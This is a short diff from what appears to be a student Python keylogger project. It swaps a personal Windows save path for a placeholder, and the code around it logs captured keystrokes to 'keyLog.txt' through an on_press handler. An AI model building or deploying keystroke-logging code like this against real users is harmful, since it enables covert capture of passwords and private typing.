@@ -11,7 +11,7 @@ import timeit
 def firstFunction():
     while(1):   
         
-        log_dir = r"C:/Users/Aayush/Desktop/VIT_TY/CS/CS_CP/"
+        log_dir = r"location to save to"
         logging.basicConfig(filename = (log_dir + "keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
         
         def on_press(key):
